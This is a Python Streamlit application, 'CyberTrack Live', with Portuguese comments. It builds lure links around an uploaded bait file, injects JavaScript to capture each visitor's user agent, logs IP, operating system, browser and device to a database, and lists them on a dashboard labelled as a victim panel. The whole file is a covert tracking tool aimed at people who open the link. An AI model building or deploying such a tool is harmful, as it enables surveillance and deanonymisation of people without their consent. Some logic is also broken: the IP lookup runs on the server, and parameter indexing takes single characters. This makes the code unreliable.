import streamlit as st
import requests
from user_agents import parse
import uuid
import os
import sqlite3
import streamlit.components.v1 as components
from datetime import datetime

# Configuração inicial
st.set_page_config(
    page_title="CyberTrack Live",
    page_icon="🕵️",
    layout="wide"
)

# Configurações
BASE_URL = "http://localhost:8501"  # Altere para sua URL em produção

# Banco de dados
conn = sqlite3.connect('cybertrack.db', check_same_thread=False)
c = conn.cursor()

# Criar tabelas
c.execute('''CREATE TABLE IF NOT EXISTS trackers
             (id TEXT PRIMARY KEY, 
              created_at DATETIME,
              captured BOOLEAN,
              ip TEXT,
              os TEXT,
              browser TEXT,
              device TEXT,
              user_agent TEXT,
              file_name TEXT,
              file_path TEXT)''')
conn.commit()

# Funções auxiliares
def get_client_info():
    try:
        # Tenta obter IP de serviços alternativos
        ip = requests.get('https://api64.ipify.org').text
    except:
        ip = "IP não detectado"
    
    # Obtém User-Agent via JavaScript
    user_agent = st.query_params.get('ua', [''])[0]
    return {'ip': ip, 'user_agent': user_agent}

def inject_user_agent():
    js_code = """
    <script>
    function getUA() {
        var ua = navigator.userAgent;
        window.location.href = window.location.href + "&ua=" + encodeURIComponent(ua);
    }
    getUA();
    </script>
    """
    components.html(js_code, height=0)

def parse_user_agent(user_agent):
    if not user_agent:
        return {}
    try:
        ua = parse(user_agent)
        return {
            'os': f"{ua.os.family} {ua.os.version_string}",
            'browser': f"{ua.browser.family} {ua.browser.version_string}",
            'device': f"{ua.device.family}",
            'user_agent': user_agent
        }
    except:
        return {}

def create_tracker(file_upload=None):
    tracker_id = str(uuid.uuid4())
    file_name = file_upload.name if file_upload else None
    file_path = f"uploads/{tracker_id}_{file_name}" if file_upload else None
    
    if file_upload:
        os.makedirs("uploads", exist_ok=True)
        with open(file_path, "wb") as f:
            f.write(file_upload.getbuffer())
    
    c.execute('''INSERT INTO trackers 
                 (id, created_at, captured) 
                 VALUES (?, ?, ?)''',
              (tracker_id, datetime.now(), False))
    conn.commit()
    
    return tracker_id, file_name, file_path

def update_tracker(tracker_id, client_info):
    ua_info = parse_user_agent(client_info['user_agent'])
    c.execute('''UPDATE trackers SET 
                 captured = ?,
                 ip = ?,
                 os = ?,
                 browser = ?,
                 device = ?,
                 user_agent = ?
                 WHERE id = ?''',
              (True,
               client_info['ip'],
               ua_info.get('os'),
               ua_info.get('browser'),
               ua_info.get('device'),
               ua_info.get('user_agent'),
               tracker_id))
    conn.commit()

# Páginas
def victim_dashboard():
    st.title("🔍 Painel de Monitoramento em Tempo Real")
    
    # Atualização manual
    if st.button("🔄 Atualizar Dados"):
        st.rerun()
    
    st.write(f"Última atualização: {datetime.now().strftime('%H:%M:%S')}")
    
    # Lista de trackers
    trackers = c.execute('''SELECT * FROM trackers 
                          ORDER BY created_at DESC''').fetchall()
    
    if not trackers:
        st.info("Nenhum rastreador criado ainda. Use o menu lateral para criar um novo.")
        return
    
    for tracker in trackers:
        status = "🔴 Ativo" if tracker[2] else "🟢 Aguardando"
        with st.expander(f"{status} | ID: {tracker[0]}", expanded=True):
            cols = st.columns([1, 3])
            
            with cols[0]:
                st.subheader("Informações Básicas")
                st.metric("Criado em", tracker[1][:19])
                
                if tracker[2]:
                    st.metric("IP Detectado", tracker[3])
                    st.metric("Sistema Operacional", tracker[4])
                else:
                    st.warning("Aguardando acesso...")
            
            with cols[1]:
                if tracker[2]:
                    st.subheader("Detalhes Técnicos")
                    st.json({
                        "Navegador": tracker[5],
                        "Dispositivo": tracker[6],
                        "User Agent": tracker[7]
                    })
                    
                    if tracker[8]:
                        try:
                            with open(tracker[9], "rb") as f:
                                st.download_button(
                                    label="📥 Baixar Arquivo Enviado",
                                    data=f,
                                    file_name=tracker[8],
                                    key=f"download_{tracker[0]}"
                                )
                        except FileNotFoundError:
                            st.error("Arquivo não encontrado")
                else:
                    st.info("Nenhum dado capturado até o momento")

def tracker_page(tracker_id):
    query_params = st.query_params
    if 'ua' not in query_params:
        inject_user_agent()
        st.stop()
    
    tracker = c.execute('''SELECT * FROM trackers 
                         WHERE id = ?''', (tracker_id,)).fetchone()
    
    if not tracker:
        st.error("Link inválido ou expirado")
        return
    
    if not tracker[2]:
        client_info = get_client_info()
        update_tracker(tracker_id, client_info)
        st.rerun()
    
    st.title("📥 Download do Arquivo")
    
    if tracker[8]:
        try:
            with open(tracker[9], "rb") as f:
                st.download_button(
                    label="Clique para baixar",
                    data=f,
                    file_name=tracker[8],
                    help="Arquivo solicitado está pronto para download"
                )
        except FileNotFoundError:
            st.error("Arquivo não encontrado no servidor")
    else:
        st.warning("Arquivo não disponível no momento")
    
    st.markdown("---")
    st.error("⚠️ Atenção: Arquivos de fontes desconhecidas podem conter riscos à segurança.")

# Sidebar
def sidebar_controls():
    with st.sidebar:
        st.header("⚙️ Controles")
        
        st.subheader("Novo Rastreador")
        uploaded_file = st.file_uploader(
            "Selecione o arquivo isca",
            type=None,
            key="file_uploader"
        )
        
        if st.button("Criar Novo Link"):
            tracker_id, file_name, file_path = create_tracker(uploaded_file)
            if file_name:
                c.execute('''UPDATE trackers 
                            SET file_name = ?, file_path = ? 
                            WHERE id = ?''',
                         (file_name, file_path, tracker_id))
                conn.commit()
            
            st.session_state['generated_id'] = tracker_id
            st.success("Rastreador criado com sucesso!")
            
            tracker_url = f"{BASE_URL}/?tracking_id={tracker_id}"
            st.markdown(f"**URL de Rastreamento:**\n```{tracker_url}```")

# Configuração principal
def main():
    sidebar_controls()
    
    query_params = st.query_params
    tracking_id = query_params.get("tracking_id", [None])[0]
    
    if tracking_id:
        tracker_page(tracking_id)
    else:
        victim_dashboard()

if __name__ == "__main__":
    # Criar diretórios necessários
    os.makedirs("uploads", exist_ok=True)
    
    # Iniciar aplicação
    main()
